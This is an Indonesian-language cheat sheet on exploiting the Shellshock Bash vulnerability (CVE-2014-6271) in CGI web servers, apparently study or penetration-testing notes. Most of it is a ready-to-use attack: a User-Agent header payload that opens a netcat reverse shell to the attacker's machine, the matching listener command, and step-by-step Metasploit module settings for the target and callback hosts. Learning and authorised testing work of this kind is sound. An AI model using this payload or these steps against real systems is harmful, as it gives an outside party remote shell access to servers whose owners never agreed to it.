# Shellshock Exploitation

## CVE Terkait

Shellshock adalah kerentanan eksekusi perintah jarak jauh (RCE) pada Bash shell, yang umumnya dieksploitasi melalui header HTTP terhadap server yang menggunakan CGI (Common Gateway Interface).

CVE-2014-6271

## Eksploitasi Manual

Shellshock dapat dieksploitasi melalui permintaan HTTP, terutama dengan memodifikasi header seperti `User-Agent`.

Contoh payload:

```
User-Agent: () { :;}; /bin/bash -c 'nc <IP-kita> <PORT-kita> -e /bin/bash'
```

### Langkah-langkah:

1. **Buka listener terlebih dahulu** di mesin attacker:

```
nc -lvp <PORT>
```

2. **Kirim request** ke target CGI endpoint (misalnya `/cgi-bin/status`) menggunakan curl atau BurpSuite dengan `User-Agent` di atas.

### Penjelasan:

- `() { :;};` adalah **empty function** yang men-trigger kerentanan Bash.

- Perintah setelahnya (`/bin/bash -c ...`) akan langsung dieksekusi oleh shell yang rentan.

---

## Eksploitasi Menggunakan Metasploit

1. Cari modul yang relevan:

```
search shellshock
```

2. Gunakan modul:

```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

3. Konfigurasi exploit:

```
show options

set RHOSTS <IP-target>

set TARGETURI <URI-target>  # Contoh: /cgi-bin/status

set LHOST <IP-attackermu>

set LPORT <PORT>
```

4. Jalankan exploit:

```
run
```

## ðŸ“š Belajar

[CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)